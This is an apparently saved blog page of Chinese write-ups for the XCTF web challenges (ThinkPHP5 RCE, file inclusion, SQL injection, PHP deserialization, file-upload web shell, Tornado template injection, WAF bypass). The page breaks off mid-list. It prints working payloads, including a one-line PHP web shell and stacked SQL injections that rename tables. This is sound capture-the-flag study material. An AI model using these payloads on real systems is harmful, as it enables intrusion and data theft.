@@ -1,0 +1,1246 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>攻防世界（Web高手区） | Gridea</title>
+<link rel="shortcut icon" href="https://https://jinqipiaopiao.github.io//favicon.ico?v=1624177818252">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://https://jinqipiaopiao.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="攻防世界（Web高手区） | Gridea - Atom Feed" href="https://https://jinqipiaopiao.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="1.baby_web
+
+思考它的题目描述：想想初始页面是哪个
+然后就可以联想到用burp suite抓包然后修改url把1.php去掉就是初始页面
+然后发送到repeater选择send然后在响应头里面可以找到flag
+
+2.Trainin..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://https://jinqipiaopiao.github.io/">
+  <img class="avatar" src="https://https://jinqipiaopiao.github.io//images/avatar.png?v=1624177818252" alt="">
+  </a>
+  <h1 class="site-title">
+    Gridea
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              攻防世界（Web高手区）
+            </h2>
+            <div class="post-info">
+              <span>
+                2021-05-18
+              </span>
+              <span>
+                45 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h1 id="1baby_web">1.baby_web</h1>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1621335001872.png" alt="" loading="lazy"><br>
+思考它的题目描述：想想初始页面是哪个<br>
+然后就可以联想到用burp suite抓包然后修改url把1.php去掉就是初始页面<br>
+然后发送到repeater选择send然后在响应头里面可以找到flag<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1621335203608.png" alt="" loading="lazy"></p>
+<h1 id="2training-www-robots">2.Training-WWW-Robots</h1>
+<p>从标题即可看出就是考的robots协议，一般在url后面添加上robots.txt即可查看相关信息<br>
+然后出现一个不允许爬取的路径，所以我们就把这个路径添加在url后面即可出现flag<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1621335523150.png" alt="" loading="lazy"><br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1621335527362.png" alt="" loading="lazy"></p>
+<h1 id="3php_rcethinkphp5-远程命令执行漏洞">3.php_rce（thinkphp5 远程命令执行漏洞）</h1>
+<p>thinkphp5 漏洞利用（具体自行百度）</p>
+<p>贴出payload：</p>
+<pre><code>?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=php%20-r%20%27system(&quot;cat%20../../../flag&quot;);%27
+</code></pre>
+<h1 id="4web_php_includephp伪协议-strstr函数的绕过">4.Web_php_include（php://伪协议 + strstr（）函数的绕过）</h1>
+<p>打开有一段php代码，考点php://伪协议 + strstr（）函数的绕过</p>
+<pre><code>&lt;?php
+show_source(__FILE__);
+echo $_GET['hello'];
+$page=$_GET['page'];
+while (strstr($page, &quot;php://&quot;)) {
+$page=str_replace(&quot;php://&quot;, &quot;&quot;, $page);
+}
+include($page);
+?&gt;
+</code></pre>
+<p>用 大小写 绕过 strstr（）函数</p>
+<p>php://input 是个可以访问请求的原始数据的只读流，可以读取到来自POST的原始数据。</p>
+<pre><code>PHP://input
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1621345117502.png" alt="" loading="lazy"><br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1621345121280.png" alt="" loading="lazy"><br>
+————————————————<br>
+版权声明：本文为CSDN博主「Captain Hammer」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
+原文链接：https://blog.csdn.net/vhkjhwbs/article/details/101448932</p>
+<h1 id="5ics-06">5.ics-06</h1>
+<p>打开题发现提示是有一处留下了入侵者的痕迹。打开地址发现只有一个页面可以打开然后发现只有一个模块可以打开，看大佬的博客然后发现是爆破id值最后发现id=2333最后得出</p>
+<pre><code>答案是：cyberpeace{38d30922c64ee626a1ca837e0e5ff3ab}
+</code></pre>
+<h1 id="6warmup">6.warmup</h1>
+<p>首先查看源码发现有一个被注释的地方是一个php文件<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622721642200.png" alt="" loading="lazy"><br>
+那么就打开source.php文件发现以下source.php中的代码，经测试，这是index.php的源代码<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622721646245.png" alt="" loading="lazy"><br>
+hint.php是什么看一下原来flag再ffffllllaaaagggg中<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622721649625.png" alt="" loading="lazy"><br>
+代码分析<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622721652796.png" alt="" loading="lazy"><br>
+整体利用的漏洞就是代码最后的include函数，利用文件包含漏洞<br>
+因此，最后的if条件语句是关键，即需要满足if(true &amp;&amp; true &amp;&amp; true)，才会执行include函数，否则输出滑稽图。</p>
+<pre><code>! empty($_REQUEST['file']满足true简单
+is_string($_REQUEST['file']满足true简单
+emmm::checkFile($_REQUEST['file']满足true，需要执行emmm类中的checkFile函数，使得该函数最终返回true才可以
+</code></pre>
+<p>整体细节详解（checkFile函数的目标就是返回true）：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622721656911.png" alt="" loading="lazy"><br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622721661608.png" alt="" loading="lazy"><br>
+疑惑：为什么urldecode没有用到？有些wp用到了，但这也是多此一举了，最后目标其实是一样的，checkFile汉纳树返回true嘛<br>
+例如用到urldecode的payload：<br>
+http://111.198.29.45:56708/index.php?file=source.php%253f../../../../../ffffllllaaaagggg<br>
+执行流程：</p>
+<p>第1个if返回false<br>
+第2个if返回false<br>
+<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mrow></mrow><mi>p</mi></msub><mi>a</mi><mi>g</mi><mi>e</mi><mo>=</mo><mi>s</mi><mi>o</mi><mi>u</mi><mi>r</mi><mi>c</mi><mi>e</mi><mi mathvariant="normal">.</mi><mi>p</mi><mi>h</mi><mi>p</mi><mi mathvariant="normal">第</mi><mn>3</mn><mi mathvariant="normal">个</mi><mi>i</mi><mi>f</mi><mi mathvariant="normal">返</mi><mi mathvariant="normal">回</mi><mi>f</mi><mi>a</mi><mi>l</mi><mi>s</mi><mi>e</mi><mi>u</mi><mi>r</mi><mi>l</mi><mi>d</mi><mi>e</mi><mi>c</mi><mi>o</mi><mi>d</mi><mi>e</mi><mi mathvariant="normal">执</mi><mi mathvariant="normal">行</mi><mi mathvariant="normal">后</mi><mi mathvariant="normal">，</mi></mrow><annotation encoding="application/x-tex">_page=source.php%3f../../../../../ffffllllaaaagggg
+第3个if返回false
+urldecode执行后，</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.716668em;vertical-align:-0.286108em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">o</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">c</span><span class="mord mathdefault">e</span><span class="mord">.</span><span class="mord mathdefault">p</span><span class="mord mathdefault">h</span><span class="mord mathdefault">p</span><span class="mord cjk_fallback">第</span><span class="mord">3</span><span class="mord cjk_fallback">个</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord cjk_fallback">返</span><span class="mord cjk_fallback">回</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">d</span><span class="mord mathdefault">e</span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">执</span><span class="mord cjk_fallback">行</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">，</span></span></span></span>_page=source.php?../../../../../ffffllllaaaagggg<br>
+执行mb_substr后$_page=source.php<br>
+return true<br>
+下面核心代码执行同理<br>
+最后include(source.php%253f../../../../../ffffllllaaaagggg)<br>
+构建payload</p>
+<pre><code>/source.php?file=source.php?../../../../../../ffffllllaaaagggg
+/source.php?file=hint.php?../../../../../ffffllllaaaagggg
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1622721685276.png" alt="" loading="lazy"><br>
+————————————————<br>
+版权声明：本文为CSDN博主「1stPeak」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
+原文链接：https://blog.csdn.net/qq_41617034/article/details/104695005</p>
+<h1 id="7newscenter">7.NewsCenter</h1>
+<p>首先做这道题如果你有phpstudy的话得先开启，不然就不能做了<br>
+点开发现是搜新闻所以就联想到了sql注入<br>
+所以就先试试到底是什么类型的sql注入，构建payload</p>
+<pre><code>试试数字型注入
+and 1=1 与 and 1=2没有区别
+所以就试试字符型注入
+' and 1=1# 与 ' and 1=2#有区别则说明是字符型注入
+</code></pre>
+<p>所以就构建一系列的语句来查询flag</p>
+<pre><code>' and 1=1 order by 1,2,3,4#     可以得出有几个字段最后发现是三个，接下来就是查看会显的是哪几个
+' and 1=2 union select 1,2,3#       可以得出会显的是2，3所以接下来就让查询的数据让在2，3位出现，先查数据库名字
+' and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#   出现news，secret_table，然后就想到flag应该在secret_table中，接着查询列名
+' and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='secret_table'#       出现id，fl4g，继续查询fl4g
+' and 1=2 union select 1,2,group_concat(fl4g) from secret_table#最后得出答案
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://https://jinqipiaopiao.github.io//post-images/1622724741932.png" alt="" loading="lazy"></figure>
+<h1 id="8nannannannan-batman">8.NaNNaNNaNNaN-Batman</h1>
+<p>知识点</p>
+<p>html乱码处理<br>
+基础js代码<br>
+eval函数，这是执行函数；这里执行了_变量中的内容也就是’'中的内容，但是，要注意的是，它并没有执行<code>$()</code>函数，仅仅执行了字符串而已（从而导致乱码），因而页面html页面没有任何显示，只显示了input标签的内容，但是我们想让源代码正常显示出来，不进行执行，那么，我们就用到了alert弹窗，将乱码的<code>$()</code>函数源码完整显示出来</p>
+<p>wp</p>
+<p>下载附件以后用文本打开，发现是js乱码：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622728078871.png" alt="" loading="lazy"><br>
+修改后缀，用html打开，发现有提交框，但是源代码仍然是乱码<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622728044769.png" alt="" loading="lazy"><br>
+将eval函数改为alert<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622728048692.png" alt="" loading="lazy"><br>
+弹窗看到源代码<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622728052024.png" alt="" loading="lazy"></p>
+<pre><code>    即：
+
+function $(){
+var e=document.getElementById(&quot;c&quot;).value;
+if(e.length==16)//构造长度为16
+if(e.match(/^be0f23/)!=null)//开头匹配到be0f23
+if(e.match(/233ac/)!=null)//e中有233ac
+if(e.match(/e98aa$/)!=null)//结尾匹配到e98aa
+if(e.match(/c7be9/)!=null){//e中有c7be9
+var t=[&quot;fl&quot;,&quot;s_a&quot;,&quot;i&quot;,&quot;e}&quot;];
+var n=[&quot;a&quot;,&quot;_h0l&quot;,&quot;n&quot;];
+var r=[&quot;g{&quot;,&quot;e&quot;,&quot;_0&quot;];
+var i=[&quot;it'&quot;,&quot;_&quot;,&quot;n&quot;];
+var s=[t,n,r,i];
+for(var o=0;o&lt;13;++o){
+document.write(s[o%4][0]);s[o%4].splice(0,1)}
+}
+}
+document.write('&lt;input id=&quot;c&quot;&gt;&lt;button οnclick=$()&gt;Ok&lt;/button&gt;');
+delete _
+</code></pre>
+<p>给的数正好可构造：e=be0f233ac7be98aa<br>
+把alert改回eval，在提交框中输入，即可得到</p>
+<pre><code>flag：flag{it’s_a_h0le_in_0ne}
+</code></pre>
+<p>————————————————<br>
+版权声明：本文为CSDN博主「vircorns」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
+原文链接：https://blog.csdn.net/weixin_43476037/article/details/102783724</p>
+<h1 id="9php2">9.PHP2</h1>
+<p>进入后神门也没有查看源代码也没<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622731693694.png" alt="" loading="lazy"><br>
+根据提示我们进行后台扫描发现phps（这里phps是我自己加入字典里的，记住就好，主要是告诉大家一个方法）<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622731680135.png" alt="" loading="lazy"><br>
+发现源代码;<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622731684970.png" alt="" loading="lazy"><br>
+查看源代码：</p>
+<pre><code>&lt;?php
+if(&quot;admin&quot;===$_GET[id]) {			
+echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);
+exit();
+}
+
+$_GET[id] = urldecode($_GET[id]);
+if($_GET[id] == &quot;admin&quot;)
+{
+echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;
+echo &quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;;
+}
+?&gt;
+
+Can you anthenticate to this website?
+</code></pre>
+<p>分析：<br>
+第一步，要使得<code>&quot;admin&quot;===$_GET[id]</code>不成立<br>
+我们可以对admin进行url编码，当然也可以对其中一个字母编码我们这里对a进行编码：%61dmin</p>
+<p>第一次实际比较<code>if(&quot;admin&quot;===&quot;%61dmin&quot;)</code>   不成立</p>
+<p>第二步，经过</p>
+<pre><code>G E T [ i d ] = u r l d e c o d e ( _GET[id] = urldecode( G​ET[id]=urldecode(_GET[id]);，使得$_GET[id] == &quot;admin&quot;成立。
+</code></pre>
+<p>经过urldecode解码后变成admin</p>
+<p>第二次实际比较if(&quot;admin&quot; == &quot;admin&quot;);    成立</p>
+<p>**注意：**当传入参数id时，浏览器在后面会对非ASCII码的字符进行一次urlencode编码，运行时会自动进行一次urldecode</p>
+<p>因为我们在url连接里直接运行，浏览器会进行一次url解码，所以我们还要进行一次url编码，就是对admin进行两次编码再运行</p>
+<pre><code>urldecode(%2561)=%61  
+urldecode(%61)=a
+
+payload：
+
+?id=%2561dmin       （是php页面不是phps页面）
+</code></pre>
+<p>————————————————<br>
+版权声明：本文为CSDN博主「Mr  H」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
+原文链接：https://blog.csdn.net/Mr_helloword/article/details/107930274</p>
+<h1 id="10unserialize3">10.unserialize3</h1>
+<p>此题考核的是反序列化知识<br>
+对象序列化<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622767460900.png" alt="" loading="lazy"></p>
+<pre><code>o:7:&quot;student&quot;:3:{s:4:&quot;name&quot;;s:4:&quot;haha&quot;;s:3:&quot;age&quot;;i:3;s:5:&quot;hobby&quot;;s:4:&quot;play&quot;;}
+</code></pre>
+<p>O代表object（若是A，则代表数组）<br>
+7代表对象名字占7个字符<br>
+3 代表三个参数<br>
+s -&gt; string i -&gt; int</p>
+<p>serialize 序列化<br>
+unserialize 反序列化</p>
+<p>补充知识</p>
+<p>__sleep() 和 __wakeup()：</p>
+<p>__sleep() 方法常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用。</p>
+<p>与之相反，unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。</p>
+<p>__wakeup() 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。</p>
+<p>__serialize() 和 __unserialize()：</p>
+<p>serialize() 函数会检查类中是否存在一个魔术方法 __serialize()。如果存在，该方法将在任何序列化之前优先执行。它必须以一个代表对象序列化形式的 键/值 成对的关联数组形式来返回，如果没有返回数组，将会抛出一个 TypeError 错误。</p>
+<p>__construct()当一个对象创建时被调用</p>
+<p>__destruct()当一个对象销毁时被调用</p>
+<p>__toString()当一个对象被当作一个字符串使用</p>
+<p>__sleep() 在对象在被序列化之前运行</p>
+<p>__wakeup()将在序列化之后立即被调用</p>
+<p>解题思路：<br>
+所以这里就应该__wakeup()绕过<br>
+反序列化时，如果表示对象属性个数的值大于真实的属性个数时就会跳过__wakeup( )的执行。</p>
+<p>影响版本：</p>
+<p>PHP before 5.6.25<br>
+7.x before 7.0.10</p>
+<p>只有xctf类<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622767646222.png" alt="" loading="lazy"><br>
+unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup<br>
+方法，预先准备对象需要的资源。</p>
+<p>故需绕过__wakeup()<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622767650498.png" alt="" loading="lazy"><br>
+利用漏洞绕过</p>
+<p>————————————————<br>
+版权声明：本文为CSDN博主「花开的时候吵到你了吗？」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
+原文链接：https://blog.csdn.net/qq_53755216/article/details/114895761</p>
+<h1 id="11upload1">11.upload1</h1>
+<p>此题考的是一句话木马直接上传一个包含php的jpg然后用蚁剑进行连接然后查看文件目录下的flag<br>
+构建一句话木马a.txt然后就改为a.jpg</p>
+<pre><code>&lt;?php eval($_POST[a]);?&gt;
+</code></pre>
+<p>然后用burp suite上传的时候修改filename=&quot;a.php&quot;<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622769865890.png" alt="" loading="lazy"><br>
+成功页面<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622769819829.png" alt="" loading="lazy"><br>
+然后就用蚁剑进行连接<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622769999557.png" alt="" loading="lazy"><br>
+然后在文件下面找关于flag的信息<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622770047022.png" alt="" loading="lazy"><br>
+答案是：</p>
+<pre><code>cyberpeace{d28b7f9fab30702668f768bb72ca4744}
+</code></pre>
+<h1 id="12web_python_template_injection">12Web_python_template_injection</h1>
+<p>见python模板注入</p>
+<h1 id="13web_php_unserialize">13.Web_php_unserialize</h1>
+<p>首先一看题目就知道考查的又是PHP代码审计中的反序列化问题。<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622873963225.png" alt="" loading="lazy"><br>
+首先看代码，可以看到，如果从上部分来看，这就是我们的序列化函数部分，而下面是输出的部分。同时又可以在下半部分的if中看到一个<code>$_GET(var)</code>这里就是一个接口。那么既然是序列化的题，我们要先试试到底能序列化出来什么东西，完了看了一下主要是两个点：<br>
+1.preg_match('/[oc]:\d+:/i',$var)的绕过<br>
+2.unserialize时__wakeup的绕过<br>
+这里给出脚本,没有什么难点,就是两个小技巧:</p>
+<pre><code>&lt;?php 
+class Demo { 
+private $file = 'index.php';
+public function __construct($file) { 
+$this-&gt;file = $file; 
+}
+function __destruct() { 
+echo @highlight_file($this-&gt;file, true); 
+}
+function __wakeup() { 
+if ($this-&gt;file != 'index.php') { 
+//the secret is in the fl4g.php
+$this-&gt;file = 'index.php'; 
+} 
+} 
+}
+$A = new Demo('fl4g.php');
+$C = serialize($A);
+//string(49) &quot;O:4:&quot;Demo&quot;:1:{s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;}&quot;
+$C = str_replace('O:4', 'O:+4',$C);//绕过preg_match
+$C = str_replace(':1:', ':2:',$C);//绕过wakeup
+var_dump($C);
+//string(49) &quot;O:+4:&quot;Demo&quot;:2:{s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;}&quot;
+var_dump(base64_encode($C));
+//string(68) &quot;TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==&quot;
+?&gt;
+</code></pre>
+<p>然后构建payload：<br>
+index.php?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==<br>
+然后即可出现答案</p>
+<h1 id="14supersqli">14.supersqli</h1>
+<p><strong>方法一：</strong></p>
+<p>1.输入1' 发现不回显，然后1'# 显示正常，应该是存在sql注入了<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622876693653.png" alt="" loading="lazy"><br>
+2.order by 2的时候是正常回显了，order by 3就出错了，只有2个字段，这时候用union select进行联合查询，发现关键字被正则过滤<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622876697905.png" alt="" loading="lazy"><br>
+3.这里考虑的是堆叠注入</p>
+<pre><code>-1';show tables #
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1622876729535.png" alt="" loading="lazy"><br>
+4.查看字段，</p>
+<pre><code>-1';show columns from `1919810931114514` #        (字符串为表名操作时要加反引号)
+
+-1';show columns from `words` #
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1622876710574.png" alt="" loading="lazy"><br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622876713705.png" alt="" loading="lazy"><br>
+5.查看值，需要绕过select的限制，我们可以使用预编译的方式</p>
+<pre><code>-1';set @sql = CONCAT('se','lect * from `1919810931114514`;');prepare stmt from @sql;EXECUTE stmt;#
+</code></pre>
+<p>拆分开来如下：</p>
+<pre><code>-1';
+
+set @sql = CONCAT('se','lect * from `1919810931114514`;');
+
+prepare stmt from @sql;
+
+EXECUTE stmt; #
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1622876736590.png" alt="" loading="lazy">6<br>
+6.这里用strstr函数过滤了set和prepare关键词，但strstr这个函数并不能区分大小写，我们将其大写即可。</p>
+<pre><code>-1';sEt @sql = CONCAT('se','lect * from `1919810931114514`;');prEpare stmt from @sql;EXECUTE stmt;#
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1622876743171.png" alt="" loading="lazy">7</p>
+<p><strong>方法二：</strong></p>
+<p>根据两个表的情况结合实际查询出结果的情况判断出words是默认查询的表，因为查询出的结果是一个数字加一个字符串，words表结构是id和data，传入的inject参数也就是赋值给了id</p>
+<p>这道题没有禁用rename和alert，所以我们可以采用修改表结构的方法来得到flag<br>
+1.由上面的探测我们可以猜测出这里会查询出words表的data列的结果。也就是类似于下面的sql语句：</p>
+<pre><code>select * from words where id = '';
+</code></pre>
+<p>2.我们将表1919810931114514名字改为words，flag列名字改为id，那么就能得到flag的内容了。</p>
+<p>修改表名和列名的语法如下：</p>
+<p>修改表名(将表名user改为users)alter table user rename to users;</p>
+<p>修改列名(将字段名username改为name)alter table users change uesrname name varchar(30);</p>
+<p>3.最终payload如下：</p>
+<pre><code>1'; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);#
+</code></pre>
+<p>拆分开来如下：</p>
+<pre><code>1';
+
+alter table words rename to words1;
+
+alter table `1919810931114514` rename to words;
+
+alter table words change flag id varchar(50);
+
+#
+</code></pre>
+<p>4.然后使用1' or 1=1#即可查询出flag</p>
+<p>方法三：</p>
+<p>使用handler查询，payload如下：</p>
+<pre><code>-1';handler `1919810931114514` open;handler `1919810931114514` read first;#
+</code></pre>
+<h1 id="15easytornado">15.easytornado</h1>
+<p>题目分析</p>
+<p>这是一道2018年护网杯的题目</p>
+<p>/flag.txt<br>
+/welcome.txt<br>
+/hints.txt</p>
+<p>一共有3个文件。</p>
+<p>/flag.txt<br>
+flag in /fllllllllllllag<br>
+/welcome.txt<br>
+render<br>
+/hints.txt<br>
+md5(cookie_secret+md5(filename))</p>
+<p>进入第一个文件flag.txt，发现好像提示文件名为/fllllllllllag，</p>
+<p>进入第二个文件welcome.txt，发现提示为render，<code>render({options})</code>去向模板中渲染数据, 可以把视图响应给客户端，猜测存在模板注入。</p>
+<p>进入第三个文件hints.txt，发现提示md5(cookie_secret + md5(filename))，即先将filenamemd5加密，再将cookie_secret与md5加密后的filename进行md5加密，目前我们需要知道的是filename和cookie_secret，猜测文件名为/fllllllllllag，也就是说，只要知道cookie_secret就行了。</p>
+<p>观察查看文件时使用的url：</p>
+<pre><code>http://111.198.29.45:56630/file?filename=/hints.txt&amp;filehash=b10fbfd1f38e8dd058abe90e0df3db8d
+</code></pre>
+<p>猜测md5(cookie_secret + md5(filename))的结果就是访问文件时所需要的filehash。</p>
+<p>尝试访问/fllllllllllag，发现跳转到错误页面<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622881452814.png" alt="" loading="lazy"><br>
+页面中存在msg，尝试：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622881456423.png" alt="" loading="lazy"><br>
+证实存在模板注入漏洞<br>
+解题过程</p>
+<p>查阅资料，发现 secure cookie 是Tornado 用于保护cookies安全的一种措施。<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622881459494.png" alt="" loading="lazy"><br>
+cookie_secret保存在settings中<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622881463100.png" alt="" loading="lazy"><br>
+发现self.application.settings有一个别名<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622881466732.png" alt="" loading="lazy"><br>
+handler指向的处理当前这个页面的RequestHandler对象， RequestHandler.settings指向self.application.settings， 因此handler.settings指向RequestHandler.application.settings。</p>
+<p>可以构造payload获取cookie_secret</p>
+<pre><code>payload:error?msg={{handler.settings}}
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1622881471523.png" alt="" loading="lazy"><br>
+获得cookie_secret，编写脚本，计算md5(cookie_secret + md5(filename))</p>
+<pre><code>import hashlib
+
+filename = '/fllllllllllllag'
+cookie_secret =&quot;4e3efacf-c763-405d-8ebb-13214cc7a7fc&quot;
+
+def getvalue(string):
+md5 = hashlib.md5()
+md5.update(string.encode('utf-8'))
+return md5.hexdigest()
+
+def merge():
+print(getvalue(cookie_secret + getvalue(filename)))
+
+merge()
+</code></pre>
+<p>结果为：5eac87b4f0ccf9fc99e86cb93fe8736f<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622881476390.png" alt="" loading="lazy"><br>
+答案是：<br>
+flag{3f39aea39db345769397ae895edb9c70}</p>
+<h1 id="easy-calc">Easy Calc</h1>
+<p>打开此题发现就是一个计算的输入框，所以就查看源码可以看到提示：<br>
+<code>&lt;!--I've set up WAF to ensure security.--&gt;</code>，提示我们这个网站是有WAF的。并且通过ajax的请求地址能看到应该还是存在一个calc.php的页面的，访问一下。<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622981965537.png" alt="" loading="lazy"><br>
+解读一下大概的内容。搜先需要我们输入一个参数名为num的GET变量。如果没有的话就直接显示calc.php的内容。也就是我们现在的状态。如果有输入参数num的话，就会拿输入的内容和设定的黑名单比较，当通过黑名单后直接就拿输入的内容执行。拿很明显这道题就算要绕过WAF已经黑名单去执行命令。</p>
+<p>PHP需要将所有URL、请求体参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：<br>
+1.删除空白符<br>
+2.将某些字符转换为下划线（包括空格）<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622981968930.png" alt="" loading="lazy"><br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622981972006.png" alt="" loading="lazy"><br>
+可以看到上面两次尝试，一次被WAF拦截了，另外一次则成功了。两次输入的内容如下：<br>
+第一次：?num=phpinfo()<br>
+第二次：?%20num=phpinfo()<br>
+区别在与第二次在参数名前面加了空字符。参考上面说的PHP字符串解析特性说的第一点，PHP在解析时会删除空字符。<br>
+WAF接受到的是? num=phpinfo()，解析出来参数名为 num，没有把空格删除，没有触发的WAF的规则。<br>
+PHP接受到的同样? num=phpinfo()，但解析出来的参数名是num，把空格删除了所以可以在后台顺利拿到参数，执行成功。</p>
+<pre><code>    成功绕过WAF后接下来就是构造命令绕过黑名单并顺利读取到flag。可能要到的几个函数：
+</code></pre>
+<p>打印函数：<br>
+var_dump(object)<br>
+print_r(object)<br>
+目录读取函数:<br>
